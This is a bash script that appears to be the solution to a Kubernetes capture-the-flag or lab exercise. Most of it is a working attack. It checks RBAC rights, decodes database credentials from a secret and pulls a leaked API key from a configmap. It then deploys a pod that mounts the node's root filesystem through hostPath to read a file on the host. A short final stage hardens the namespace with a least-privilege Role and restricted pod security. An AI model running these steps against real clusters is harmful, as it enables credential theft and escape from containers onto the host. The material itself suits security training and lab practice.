#!/bin/bash
set -u
export KUBECONFIG=$HOME/.kube/config

echo "=== [1/4] recon_rbac ==="
printf "list_secrets=%s\ncreate_pods=%s\n" \
  "$(kubectl auth can-i list secrets -n app)" \
  "$(kubectl auth can-i create pods -n app)" | tee ~/recon.txt

echo "=== [2/4] loot_secrets ==="
{ echo "== secret db-credentials =="
  kubectl get secret db-credentials -n app -o jsonpath='{.data.username}' | base64 -d; echo
  kubectl get secret db-credentials -n app -o jsonpath='{.data.password}' | base64 -d; echo
  echo "== configmap app-config (leaked secret) =="
  kubectl get configmap app-config -n app -o yaml | grep -i legacy_api_key
} | tee ~/loot.txt

echo "=== [3/4] escape_node ==="
cat > /tmp/escape.yaml <<'YML'
apiVersion: v1
kind: Pod
metadata:
  name: maintenance-shell
  namespace: app
spec:
  containers:
  - name: shell
    image: busybox:1.36
    imagePullPolicy: Never
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
YML
kubectl apply -f /tmp/escape.yaml
kubectl wait --for=condition=Ready pod/maintenance-shell -n app --timeout=180s || true
for i in 1 2 3 4 5 6 7 8 9 10; do
    F=$(kubectl exec maintenance-shell -n app -- cat /host/opt/host-secrets/flag.txt 2>/dev/null | tr -d '\r\n ')
    if [ -n "$F" ]; then printf '%s' "$F" > ~/flag.txt; break; fi
    sleep 5
done
echo "flag: $(cat ~/flag.txt 2>/dev/null)"

echo "=== [4/4] harden_cluster (use admin rights to patch) ==="
export KUBECONFIG=$HOME/.kube/admin-config
cat > /tmp/least-priv-role.yaml <<'YML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: app
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]
    verbs: ["get"]
YML
kubectl apply -f /tmp/least-priv-role.yaml
kubectl label ns app pod-security.kubernetes.io/enforce=restricted --overwrite
export KUBECONFIG=$HOME/.kube/config
printf "list_secrets_after=%s\ncreate_pods_after=%s\n" \
  "$(kubectl auth can-i list secrets -n app)" \
  "$(kubectl auth can-i create pods -n app)" | tee ~/harden_verify.txt
